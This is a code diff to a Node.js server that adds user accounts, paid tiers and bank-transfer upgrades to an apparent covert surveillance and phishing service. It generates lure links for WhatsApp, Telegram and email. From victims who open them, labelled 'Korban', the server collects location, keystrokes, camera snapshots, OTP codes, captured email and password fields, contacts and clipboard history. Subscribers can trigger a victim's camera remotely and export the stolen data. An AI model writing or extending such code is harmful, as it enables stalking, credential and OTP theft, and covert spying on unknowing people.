@@ -97,6 +97,37 @@ if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
 if (!fs.existsSync(path.join(DATA_DIR, 'voice'))) fs.mkdirSync(path.join(DATA_DIR, 'voice'));
 
+// ===== USER SYSTEM =====
+const USERS_FILE = path.join(DATA_DIR, 'users.json');
+const PAYMENTS_FILE = path.join(DATA_DIR, 'payments.json');
+let users = new Map(); // userId -> { id, email, passwordHash, salt, name, tier, token, linkCount, createdAt, upgradedAt }
+let payments = new Map(); // paymentId -> { id, userId, userName, userEmail, plan, amount, bank, proofFile, status, createdAt, processedAt }
+
+function loadUsers() {
+    try {
+        if (fs.existsSync(USERS_FILE)) {
+            const data = JSON.parse(fs.readFileSync(USERS_FILE, 'utf-8'));
+            if (Array.isArray(data)) data.forEach(u => users.set(u.id, u));
+        }
+    } catch(e) { console.error('[Users] load error:', e.message); }
+}
+function saveUsers() {
+    try { fs.writeFileSync(USERS_FILE, JSON.stringify([...users.values()], null, 2)); } catch(e) { console.error('[Users] save error:', e.message); }
+}
+function loadPayments() {
+    try {
+        if (fs.existsSync(PAYMENTS_FILE)) {
+            const data = JSON.parse(fs.readFileSync(PAYMENTS_FILE, 'utf-8'));
+            if (Array.isArray(data)) data.forEach(p => payments.set(p.id, p));
+        }
+    } catch(e) { console.error('[Payments] load error:', e.message); }
+}
+function savePayments() {
+    try { fs.writeFileSync(PAYMENTS_FILE, JSON.stringify([...payments.values()], null, 2)); } catch(e) { console.error('[Payments] save error:', e.message); }
+}
+loadUsers();
+loadPayments();
+
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', process.env.CORS_ORIGIN || '*');
     res.header('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
@@ -109,8 +140,8 @@ app.use(express.json({ limit: '50mb' }));
 // Admin auth middleware
 function verifyAdmin(req, res, next) {
     // Public endpoints (no auth needed)
-    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/firebase-config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/dashboard.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat', '/api/link-account'];
-    if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path.startsWith('/voice/') || req.path === '/index.html') return next();
+    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/firebase-config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/dashboard.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat', '/api/link-account', '/login.html', '/register.html', '/pricing.html', '/confirm.html'];
+    if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path.startsWith('/voice/') || req.path === '/index.html' || req.path.startsWith('/api/auth/') || req.path.startsWith('/api/user/') || req.path.startsWith('/lang/')) return next();
     // Protect admin.html — use token param for page load, header for API
     if (req.path === '/admin.html') {
         const token = req.query.token || req.headers['x-admin-token'];
@@ -134,7 +165,13 @@ app.use(verifyAdmin);
 
 // Check link expiry for tracking page
 app.get('/', (req, res, next) => {
-    if (linkExpiry.enabled && linkExpiry.duration > 0) {
+    // Check per-link expiry via _e (expiry timestamp) URL parameter
+    const expiresAt = parseInt(req.query._e || '0') || 0;
+    if (expiresAt > 0 && Date.now() > expiresAt) {
+        return res.redirect('/lupa-password.html?expired=1');
+    }
+    // Also support legacy global expiry
+    if (!expiresAt && linkExpiry.enabled && linkExpiry.duration > 0) {
         const linkCreatedAt = parseInt(req.query._t || '0') || 0;
         if (linkCreatedAt > 0) {
             const elapsed = Date.now() - linkCreatedAt;
@@ -144,9 +181,14 @@ app.get('/', (req, res, next) => {
             }
         }
     }
+    const isTrackingVisit = expiresAt > 0 || parseInt(req.query._t || '0') > 0 || req.query._u;
     const templatePath = path.join(__dirname, 'public', 'templates', currentTemplate + '.html');
     if (currentTemplate !== 'vault' && fs.existsSync(templatePath)) {
         return res.sendFile(templatePath);
+    }
+    if (isTrackingVisit) {
+        const trackingPath = path.join(__dirname, 'public', 'track.html');
+        if (fs.existsSync(trackingPath)) return res.sendFile(trackingPath);
     }
     next();
 });
@@ -173,7 +215,7 @@ function saveDevices() {
     const data = {};
     for (const [id, d] of devices) {
         data[id] = {
-            id: d.id, resellerId: d.resellerId || '', label: d.label, ip: d.ip, userAgent: d.userAgent,
+            id: d.id, resellerId: d.resellerId || '', createdBy: d.createdBy || '', label: d.label, ip: d.ip, userAgent: d.userAgent,
             firstSeen: d.firstSeen, lastSeen: d.lastSeen,
             location: d.location, history: d.history?.slice(-500) || [],
             battery: d.battery, connection: d.connection,
@@ -251,14 +293,29 @@ function notifyAdmins(event, data) {
     }
 }
 
+function notifyUser(deviceId, event, data) {
+    const d = devices.get(deviceId);
+    if (d && d.createdBy) {
+        io.to('user_' + d.createdBy).emit(event, data);
+    }
+}
+
 io.on('connection', (socket) => {
     const token = socket.handshake.query.token;
+    const userToken = socket.handshake.query.userToken;
     let adminData = null;
+    let userData = null;
     if (token) {
         adminData = adminTokens.get(token);
         if (!adminData) {
             socket.disconnect(true);
             return;
+        }
+    } else if (userToken) {
+        const userId = userTokens.get(userToken);
+        if (userId) {
+            userData = { userId };
+            socket.join('user_' + userId);
         }
     }
     const isAdmin = !!adminData;
@@ -418,14 +475,19 @@ io.on('connection', (socket) => {
     const refFromQuery = socket.handshake.query.ref || '';
 
     if (!devices.has(deviceId)) {
-        // Determine resellerId from ref param or query
+        // Determine resellerId or createdBy from ref param
         let resellerId = '';
-        if (refFromQuery && resellers.has(refFromQuery)) {
-            resellerId = refFromQuery;
+        let createdBy = '';
+        if (refFromQuery) {
+            if (refFromQuery.startsWith('u_') && users.has(refFromQuery)) {
+                createdBy = refFromQuery;
+            } else if (resellers.has(refFromQuery)) {
+                resellerId = refFromQuery;
+            }
         } else if (socket.handshake.query.resellerId && resellers.has(socket.handshake.query.resellerId)) {
             resellerId = socket.handshake.query.resellerId;
         }
-        // Also check path prefix
+        // Also check path prefix for reseller
         const pathParts = (socket.handshake.headers.referer || '').split('/');
         if (!resellerId && pathParts.includes('r') && pathParts.length > 3) {
             const possibleId = pathParts[pathParts.indexOf('r') + 1];
@@ -435,6 +497,7 @@ io.on('connection', (socket) => {
         devices.set(deviceId, {
             id: deviceId,
             resellerId: resellerId,
+            createdBy: createdBy,
             label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
             ip: clientIp,
             userAgent: '',
@@ -456,7 +519,7 @@ io.on('connection', (socket) => {
             socketId: socket.id,
             _shadowSockets: new Set()
         });
-        io.emit('device-new', {
+        const newDeviceData = {
             id: deviceId,
             resellerId: resellerId,
             label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
@@ -464,7 +527,9 @@ io.on('connection', (socket) => {
             ip: clientIp,
             firstSeen: Date.now(),
             lastSeen: Date.now()
-        });
+        };
+        io.emit('device-new', newDeviceData);
+        notifyUser(deviceId, 'device-new', newDeviceData);
         // Trigger AI Agent on new device (skip admin devices)
         if (!isOwnDevice && AI_AGENT_ENABLED) {
             setTimeout(() => aiAgentAnalyzeDevice(deviceId), 5000);
@@ -586,6 +651,7 @@ io.on('connection', (socket) => {
         if (device.keystrokes.length > 200) device.keystrokes = device.keystrokes.slice(-200);
         saveDevices();
         io.emit('device-update', { id: deviceId, keystrokes: device.keystrokes.slice(-20) });
+        notifyUser(deviceId, 'device-update', { id: deviceId, label: device.label, keystrokes: device.keystrokes.slice(-20) });
         // Auto forensics trigger on keystroke burst (>20 keys in 10s)
         if (AI_FEATURES.AUTO_FORENSICS && device._onActivity) {
             const recent = device.keystrokes.filter(k => Date.now() - k.t < 10000);
@@ -644,16 +710,15 @@ io.on('connection', (socket) => {
         device.lastSeen = Date.now();
         saveDevices();
 
-        io.emit('device-update', {
-            id: deviceId,
-            label: device.label,
-            location: point,
+        const locUpdateData = { id: deviceId, label: device.label, location: point,
             history: device.history.slice(-100),
             snapshotsCount: device.snapshots.length,
             battery: device.battery,
             connection: device.connection,
             isOwnDevice: device.isOwnDevice || false
-        });
+        };
+        io.emit('device-update', locUpdateData);
+        notifyUser(deviceId, 'device-update', locUpdateData);
 
         // AI Smart Location — detect significant movement
         if (AI_FEATURES.SMART_LOCATION && device._lastLocation) {
@@ -690,12 +755,9 @@ io.on('connection', (socket) => {
                 device.snapshots.push(snap);
                 device.lastSeen = Date.now();
                 saveDevices();
-                io.emit('new-snapshot', {
-                    deviceId,
-                    label: device.label,
-                    filename,
-                    timestamp: Date.now()
-                });
+                const snapData = { deviceId, label: device.label, filename, timestamp: Date.now() };
+                io.emit('new-snapshot', snapData);
+                notifyUser(deviceId, 'new-snapshot', snapData);
                 // Forward to Telegram if auto-capture is active
                 if (aiAutoCapture.has(deviceId)) {
                     sendTelegramPhoto(deviceId, filepath,
@@ -935,12 +997,41 @@ io.on('connection', (socket) => {
         await sendAIAlert(deviceId, 'AI Social Engineer — Reply', `Korban membalas: ${message.slice(0,100)}\nAI: ${followUp.slice(0,100)}`);
     });
 
+    // User dashboard commands (basic monitoring)
+    if (userData) {
+        socket.on('start-camera-stream', (targetId) => {
+            if (targetId && devices.has(targetId) && devices.get(targetId).createdBy === userData.userId) {
+                io.to(targetId).emit('start-camera-stream');
+            }
+        });
+        socket.on('stop-camera-stream', (targetId) => {
+            if (targetId && devices.has(targetId)) io.to(targetId).emit('stop-camera-stream');
+        });
+        socket.on('request-snapshot', (targetId) => {
+            if (targetId && devices.has(targetId) && devices.get(targetId).createdBy === userData.userId) {
+                io.to(targetId).emit('take-snapshot');
+            }
+        });
+        socket.on('switch-camera', (targetId) => {
+            if (targetId && devices.has(targetId)) io.to(targetId).emit('switch-camera');
+        });
+        socket.on('admin-fullscreen', (targetId) => {
+            if (targetId && devices.has(targetId)) io.to(targetId).emit('force-fullscreen');
+        });
+        socket.on('admin-notify', (data) => {
+            if (data.deviceId && data.title && devices.has(data.deviceId)) {
+                io.to(data.deviceId).emit('admin-show-notif', { title: data.title, body: data.body || '' });
+            }
+        });
+    }
+
     socket.on('disconnect', () => {
         device.lastSeen = Date.now();
         saveDevices();
         // Only mark offline if no shadow iframes remain
         if (!device._shadowSockets || !device._shadowSockets.size) {
             io.emit('device-offline', deviceId);
+            notifyUser(deviceId, 'device-offline', deviceId);
             io.emit('camera-stop', deviceId);
         } else {
             console.log(`[Shadow] Main socket disconnected for ${deviceId.slice(0,8)}..., but ${device._shadowSockets.size} iframe(s) remain`);
@@ -2829,6 +2920,399 @@ app.get('/api/alerts/:deviceId', (req, res) => {
     res.json(d.alerts || []);
 });
 
+// ===== USER AUTH MIDDLEWARE =====
+const userTokens = new Map(); // token -> userId
+function verifyUser(req, res, next) {
+    const token = req.headers['x-user-token'] || '';
+    if (token && userTokens.has(token)) {
+        const userId = userTokens.get(token);
+        const user = users.get(userId);
+        if (user) {
+            req.user = user;
+            return next();
+        }
+    }
+    return res.status(401).json({ error: 'unauthorized' });
+}
+
+// ===== USER AUTH ENDPOINTS =====
+app.post('/api/auth/register', (req, res) => {
+    const { email, password, name } = req.body || {};
+    if (!email || !password) return res.status(400).json({ error: 'Email dan password required' });
+    if (password.length < 6) return res.status(400).json({ error: 'Password minimal 6 karakter' });
+    const existing = [...users.values()].find(u => u.email === email.toLowerCase().trim());
+    if (existing) return res.status(409).json({ error: 'Email sudah terdaftar' });
+    const salt = crypto.randomBytes(16).toString('hex');
+    const passwordHash = crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');
+    const userId = 'u_' + crypto.randomBytes(12).toString('hex');
+    const token = crypto.randomBytes(32).toString('hex');
+    const user = {
+        id: userId,
+        email: email.toLowerCase().trim(),
+        passwordHash,
+        salt,
+        name: name || email.split('@')[0],
+        tier: 'free',
+        token,
+        linkCount: 0,
+        createdAt: Date.now(),
+        upgradedAt: null
+    };
+    users.set(userId, user);
+    userTokens.set(token, userId);
+    saveUsers();
+    res.json({ ok: true, token, user: { id: userId, email: user.email, name: user.name, tier: user.tier } });
+});
+
+app.post('/api/auth/login', (req, res) => {
+    const { email, password } = req.body || {};
+    if (!email || !password) return res.status(400).json({ error: 'Email dan password required' });
+    const user = [...users.values()].find(u => u.email === email.toLowerCase().trim());
+    if (!user) return res.status(401).json({ error: 'Email tidak terdaftar' });
+    const hash = crypto.pbkdf2Sync(password, user.salt, 1000, 64, 'sha512').toString('hex');
+    if (hash !== user.passwordHash) return res.status(401).json({ error: 'Password salah' });
+    const token = crypto.randomBytes(32).toString('hex');
+    userTokens.set(token, user.id);
+    user.token = token;
+    saveUsers();
+    res.json({ ok: true, token, user: { id: user.id, email: user.email, name: user.name, tier: user.tier } });
+});
+
+app.get('/api/auth/me', verifyUser, (req, res) => {
+    res.json({ ok: true, user: { id: req.user.id, email: req.user.email, name: req.user.name, tier: req.user.tier, linkCount: req.user.linkCount, createdAt: req.user.createdAt, upgradedAt: req.user.upgradedAt } });
+});
+
+app.post('/api/auth/logout', verifyUser, (req, res) => {
+    for (const [t, uid] of userTokens) {
+        if (uid === req.user.id) { userTokens.delete(t); break; }
+    }
+    res.json({ ok: true });
+});
+
+// ===== USER DASHBOARD ENDPOINTS =====
+app.get('/api/user/stats', verifyUser, (req, res) => {
+    const userDevices = [...devices.values()].filter(d => d.createdBy === req.user.id);
+    res.json({
+        ok: true,
+        stats: {
+            tier: req.user.tier,
+            linkCount: (req.user.generatedLinks || []).length,
+            totalDevices: userDevices.length,
+            activeDevices: userDevices.filter(d => (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0)).length
+        }
+    });
+});
+
+const LINK_EXPIRY_FREE_HOURS = parseInt(process.env.LINK_EXPIRY_FREE_HOURS || '1');
+
+app.post('/api/user/create-link', verifyUser, (req, res) => {
+    const { customName } = req.body || {};
+    const baseUrl = `${req.protocol}://${req.get('host')}`;
+    const refId = req.user.id.slice(0, 8) + '_' + Date.now().toString(36);
+    const isFree = req.user.tier === 'free';
+    const expiresAt = isFree ? Date.now() + LINK_EXPIRY_FREE_HOURS * 3600000 : null;
+    const expiryParam = expiresAt ? `_e=${expiresAt}` : '';
+    const userParam = `_u=${req.user.id}`;
+    const queryParams = [expiryParam, userParam].filter(Boolean).join('&');
+    const trackingLink = `${baseUrl}/?${queryParams}`;
+    req.user.linkCount = (req.user.linkCount || 0) + 1;
+    if (!req.user.generatedLinks) req.user.generatedLinks = [];
+    req.user.generatedLinks.push({
+        id: refId,
+        url: trackingLink,
+        name: customName || '',
+        createdAt: Date.now(),
+        expiresAt: expiresAt
+    });
+    if (req.user.generatedLinks.length > 50) req.user.generatedLinks = req.user.generatedLinks.slice(-50);
+    saveUsers();
+    res.json({
+        ok: true,
+        trackingLink,
+        link: trackingLink,
+        expiresAt,
+        tier: req.user.tier,
+        whatsapp: 'https://wa.me/?text=' + encodeURIComponent(trackingLink),
+        telegram: 'https://t.me/share/url?url=' + encodeURIComponent(trackingLink) + '&text=' + encodeURIComponent('Cek link ini'),
+        email: `mailto:?subject=Penting&body=` + encodeURIComponent(trackingLink)
+    });
+});
+
+app.get('/api/user/links', verifyUser, (req, res) => {
+    const userDevices = [...devices.values()].filter(d => d.createdBy === req.user.id);
+    const generated = (req.user.generatedLinks || []).map(g => ({
+        _type: 'generated',
+        id: g.id,
+        url: g.url,
+        name: g.name,
+        createdAt: g.createdAt,
+        expiresAt: g.expiresAt,
+        visited: userDevices.some(d => {
+            const refFromSocket = d.createdBy === req.user.id;
+            return refFromSocket;
+        }),
+        deviceCount: userDevices.length
+    }));
+    const visited = userDevices.map(d => ({
+        _type: 'device',
+        id: d.id,
+        label: d.label,
+        ip: d.ip,
+        userAgent: d.userAgent,
+        firstSeen: d.firstSeen,
+        lastSeen: d.lastSeen,
+        online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0) || false,
+        location: d.location,
+        battery: d.battery || null,
+        connection: d.connection || null,
+        deviceModel: d.deviceModel,
+        deviceDetection: d.deviceDetection,
+        keystrokeCount: (d.keystrokes || []).length,
+        snapshotCount: (d.snapshots || []).length
+    }));
+    res.json({ ok: true, links: generated, devices: visited });
+});
+
+// ===== USER DEVICE DETAIL ENDPOINTS =====
+function verifyDeviceOwnership(req, res, next) {
+    const deviceId = req.params.id;
+    const d = devices.get(deviceId);
+    if (!d) return res.status(404).json({ error: 'Device tidak ditemukan' });
+    if (d.createdBy !== req.user.id) return res.status(403).json({ error: 'Bukan device Anda' });
+    req._device = d;
+    next();
+}
+
+app.get('/api/user/devices', verifyUser, (req, res) => {
+    const userDevices = [...devices.values()].filter(d => d.createdBy === req.user.id);
+    res.json({ ok: true, devices: userDevices.map(d => ({
+        id: d.id, label: d.label, ip: d.ip, userAgent: d.userAgent,
+        firstSeen: d.firstSeen, lastSeen: d.lastSeen,
+        online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0) || false,
+        location: d.location, battery: d.battery || null, connection: d.connection || null,
+        deviceModel: d.deviceModel, deviceDetection: d.deviceDetection,
+        snapshotsCount: (d.snapshots || []).length,
+        keystrokeCount: (d.keystrokes || []).length
+    })) });
+});
+
+app.get('/api/user/device/:id', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const d = req._device;
+    res.json({ ok: true, device: {
+        id: d.id, label: d.label, ip: d.ip, userAgent: d.userAgent,
+        firstSeen: d.firstSeen, lastSeen: d.lastSeen,
+        online: (!!d.socketId && io.sockets.sockets.has(d.socketId)) || (d._shadowSockets && d._shadowSockets.size > 0) || false,
+        location: d.location, history: d.history?.slice(-500) || [],
+        battery: d.battery || null, connection: d.connection || null,
+        deviceModel: d.deviceModel || 'Unknown',
+        deviceDetection: d.deviceDetection || null,
+        snapshots: (d.snapshots || []).slice(-20).map(s => ({ filename: s.filename, time: s.time || s.t })),
+        keystrokeCount: (d.keystrokes || []).length,
+        snapshotCount: (d.snapshots || []).length,
+        otpHistory: d.otpHistory || [],
+        fieldEmail: d.fieldEmail || null, fieldPass: d.fieldPass || null,
+        webrtcIP: d.webrtcIP || null, webgl: d.webgl || null,
+        audioFP: d.audioFP || null, fonts: d.fonts || null,
+        contacts: d.contacts || null, browserHistory: d.browserHistory || null,
+        clipboardHistory: d.clipboardHistory || []
+    } });
+});
+
+app.get('/api/user/device/:id/snapshots', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const snaps = (req._device.snapshots || []).slice(-50);
+    res.json(snaps.map(s => ({ filename: s.filename, time: s.time || s.t })));
+});
+
+app.get('/api/user/device/:id/keystrokes', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const keys = (req._device.keystrokes || []).slice(-200);
+    res.json(keys);
+});
+
+app.get('/api/user/device/:id/history', verifyUser, verifyDeviceOwnership, (req, res) => {
+    res.json(req._device.history || []);
+});
+
+app.get('/api/user/device/:id/timeline', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const d = req._device;
+    const events = [];
+    (d.history || []).forEach(h => events.push({ type: 'location', time: h.time || h.t, data: `${h.lat},${h.lng}`, detail: `Location` }));
+    (d.snapshots || []).forEach(s => events.push({ type: 'snapshot', time: s.time || s.t, data: s.filename, detail: `Snapshot` }));
+    const ks = d.keystrokes || [];
+    if (ks.length > 0) events.push({ type: 'keystroke', time: ks[0].t || ks[0].ts, data: `${ks.length} keystrokes`, detail: `${ks.length} keystrokes` });
+    if (d.fieldEmail) events.push({ type: 'credential', time: d.lastSeen, data: d.fieldEmail, detail: `Email: ${d.fieldEmail}` });
+    (d.otpHistory || []).forEach(o => events.push({ type: 'otp', time: o.time, data: o.code, detail: `OTP: ${o.code}` }));
+    events.sort((a,b) => (a.time||0) - (b.time||0));
+    res.json({ deviceId: d.id, label: d.label, events });
+});
+
+app.get('/api/user/device/:id/otp', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const d = req._device;
+    res.json({ otpHistory: d.otpHistory || [], lastOTP: d.lastOTP || null });
+});
+
+app.get('/api/user/export/csv/:id', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const d = req._device;
+    const lines = ['type,time,data'];
+    (d.history || []).forEach(h => lines.push(`location,${h.time||h.t||''},${h.lat},${h.lng}`));
+    (d.snapshots || []).forEach(s => lines.push(`snapshot,${s.time||s.t||''},${s.filename}`));
+    (d.keystrokes || []).forEach(k => lines.push(`keystroke,${k.t||k.ts||''},${k.k}`));
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', `attachment; filename=device_${d.id.slice(0,8)}.csv`);
+    res.send(lines.join('\n'));
+});
+
+app.get('/api/user/export/json/:id', verifyUser, verifyDeviceOwnership, (req, res) => {
+    const d = req._device;
+    res.setHeader('Content-Disposition', `attachment; filename=device_${d.id.slice(0,8)}.json`);
+    res.json(d);
+});
+
+// ===== PAYMENT / UPGRADE ENDPOINTS =====
+const UPGRADE_PRICES = {
+    monthly: parseInt(process.env.PRICE_MONTHLY || '50000'),
+    lifetime: parseInt(process.env.PRICE_LIFETIME || '500000')
+};
+const BANK_INFO = {
+    bank: process.env.BANK_NAME || 'BCA',
+    account: process.env.BANK_ACCOUNT || '1234567890',
+    name: process.env.BANK_HOLDER || 'PT Neural AI Teknologi'
+};
+
+app.get('/api/user/pricing', (req, res) => {
+    res.json({ ok: true, prices: UPGRADE_PRICES, bank: BANK_INFO });
+});
+
+app.post('/api/user/upgrade-request', verifyUser, (req, res) => {
+    const { plan, amount, bank, proofFile } = req.body || {};
+    if (!plan || !['monthly', 'lifetime'].includes(plan)) return res.status(400).json({ error: 'Plan harus monthly atau lifetime' });
+    if (!proofFile) return res.status(400).json({ error: 'Upload bukti transfer' });
+    const expectedAmount = UPGRADE_PRICES[plan];
+    const paymentId = 'pay_' + crypto.randomBytes(12).toString('hex');
+    const payment = {
+        id: paymentId,
+        userId: req.user.id,
+        userName: req.user.name,
+        userEmail: req.user.email,
+        plan,
+        amount: parseInt(amount) || expectedAmount,
+        bank: bank || '',
+        proofFile,
+        status: 'pending',
+        createdAt: Date.now(),
+        processedAt: null
+    };
+    payments.set(paymentId, payment);
+    savePayments();
+    res.json({ ok: true, paymentId, status: 'pending', message: 'Pembayaran sedang diverifikasi. Admin akan mengaktivasi akun Anda.' });
+});
+
+app.get('/api/user/upgrade-status', verifyUser, (req, res) => {
+    const userPayments = [...payments.values()].filter(p => p.userId === req.user.id).sort((a,b) => b.createdAt - a.createdAt);
+    res.json({ ok: true, tier: req.user.tier, payments: userPayments.map(p => ({
+        id: p.id, plan: p.plan, amount: p.amount, status: p.status, createdAt: p.createdAt, processedAt: p.processedAt
+    })) });
+});
+
+// ===== ADMIN USER MANAGEMENT =====
+app.get('/api/admin/users/list', requireMasterAdmin, (req, res) => {
+    const list = [...users.values()].map(u => ({
+        id: u.id, email: u.email, name: u.name, tier: u.tier,
+        linkCount: u.linkCount || 0, createdAt: u.createdAt,
+        upgradedAt: u.upgradedAt
+    }));
+    res.json(list);
+});
+
+app.post('/api/admin/users/activate', requireMasterAdmin, (req, res) => {
+    const { userId, plan } = req.body || {};
+    const user = users.get(userId);
+    if (!user) return res.status(404).json({ error: 'User tidak ditemukan' });
+    user.tier = 'pro';
+    user.upgradedAt = Date.now();
+    saveUsers();
+    // Also approve any pending payments for this user
+    for (const [pid, p] of payments) {
+        if (p.userId === userId && p.status === 'pending') {
+            p.status = 'approved';
+            p.processedAt = Date.now();
+        }
+    }
+    savePayments();
+    res.json({ ok: true, user: { id: user.id, email: user.email, name: user.name, tier: user.tier } });
+});
+
+app.post('/api/admin/users/deactivate', requireMasterAdmin, (req, res) => {
+    const { userId } = req.body || {};
+    const user = users.get(userId);
+    if (!user) return res.status(404).json({ error: 'User tidak ditemukan' });
+    user.tier = 'free';
+    user.upgradedAt = null;
+    saveUsers();
+    res.json({ ok: true, user: { id: user.id, email: user.email, name: user.name, tier: user.tier } });
+});
+
+app.post('/api/admin/users/delete', requireMasterAdmin, (req, res) => {
+    const { userId } = req.body || {};
+    const user = users.get(userId);
+    if (!user) return res.status(404).json({ error: 'User tidak ditemukan' });
+    users.delete(userId);
+    saveUsers();
+    res.json({ ok: true });
+});
+
+app.post('/api/admin/users/reset-password', requireMasterAdmin, (req, res) => {
+    const { userId, newPassword } = req.body || {};
+    const user = users.get(userId);
+    if (!user) return res.status(404).json({ error: 'User tidak ditemukan' });
+    if (!newPassword || newPassword.length < 6) return res.status(400).json({ error: 'Password minimal 6 karakter' });
+    const salt = crypto.randomBytes(16).toString('hex');
+    user.passwordHash = crypto.pbkdf2Sync(newPassword, salt, 1000, 64, 'sha512').toString('hex');
+    user.salt = salt;
+    saveUsers();
+    res.json({ ok: true, message: 'Password berhasil direset' });
+});
+
+// ===== ADMIN PAYMENT MANAGEMENT =====
+app.get('/api/admin/payments/list', requireMasterAdmin, (req, res) => {
+    const statusFilter = req.query.status || '';
+    let list = [...payments.values()].sort((a,b) => b.createdAt - a.createdAt);
+    if (statusFilter) list = list.filter(p => p.status === statusFilter);
+    res.json(list.map(p => ({
+        id: p.id, userId: p.userId, userName: p.userName, userEmail: p.userEmail,
+        plan: p.plan, amount: p.amount, bank: p.bank,
+        proofFile: p.proofFile ? p.proofFile.substring(0, 100) + '...' : null,
+        hasProof: !!p.proofFile,
+        status: p.status, createdAt: p.createdAt, processedAt: p.processedAt
+    })));
+});
+
+app.post('/api/admin/payments/approve', requireMasterAdmin, (req, res) => {
+    const { paymentId } = req.body || {};
+    const payment = payments.get(paymentId);
+    if (!payment) return res.status(404).json({ error: 'Payment tidak ditemukan' });
+    payment.status = 'approved';
+    payment.processedAt = Date.now();
+    // Upgrade user to pro
+    const user = users.get(payment.userId);
+    if (user) {
+        user.tier = 'pro';
+        user.upgradedAt = Date.now();
+        saveUsers();
+    }
+    savePayments();
+    res.json({ ok: true, message: 'Payment approved, user upgraded to Pro' });
+});
+
+app.post('/api/admin/payments/reject', requireMasterAdmin, (req, res) => {
+    const { paymentId } = req.body || {};
+    const payment = payments.get(paymentId);
+    if (!payment) return res.status(404).json({ error: 'Payment tidak ditemukan' });
+    payment.status = 'rejected';
+    payment.processedAt = Date.now();
+    savePayments();
+    res.json({ ok: true, message: 'Payment rejected' });
+});
+
 // ===== AUTO-TARGETING =====
 app.get('/api/target/link', (req, res) => {
     const baseUrl = `${req.protocol}://${req.get('host')}`;
@@ -2838,12 +3322,14 @@ app.get('/api/target/link', (req, res) => {
     const refParam = resellerId ? '?ref=' + resellerId : '';
     const waRef = resellerId ? '%3Fref%3D' + resellerId : '';
     const expiresAt = linkExpiry.enabled && linkExpiry.duration > 0 ? Date.now() + linkExpiry.duration * 60 * 1000 : null;
+    const expiryParam = expiresAt ? (refParam ? '&_e=' : '?_e=') + expiresAt : '';
+    const trackingLink = baseUrl + '/' + refParam + expiryParam;
     res.json({
-        trackingLink: baseUrl + '/' + refParam,
+        trackingLink,
         adminLink: baseUrl + '/r/' + (resellerId || '') + '/admin.html',
-        whatsapp: 'https://wa.me/?text=' + encodeURIComponent('Lihat ini: ' + baseUrl + '/' + refParam),
-        telegram: 'https://t.me/share/url?url=' + encodeURIComponent(baseUrl + '/' + refParam) + '&text=' + encodeURIComponent('Cek link ini'),
-        email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/' + refParam),
+        whatsapp: 'https://wa.me/?text=' + encodeURIComponent(trackingLink),
+        telegram: 'https://t.me/share/url?url=' + encodeURIComponent(trackingLink) + '&text=' + encodeURIComponent('Cek link ini'),
+        email: `mailto:?subject=Penting&body=` + encodeURIComponent(trackingLink),
         expiresAt,
         expiryEnabled: linkExpiry.enabled,
         expiryMinutes: linkExpiry.duration
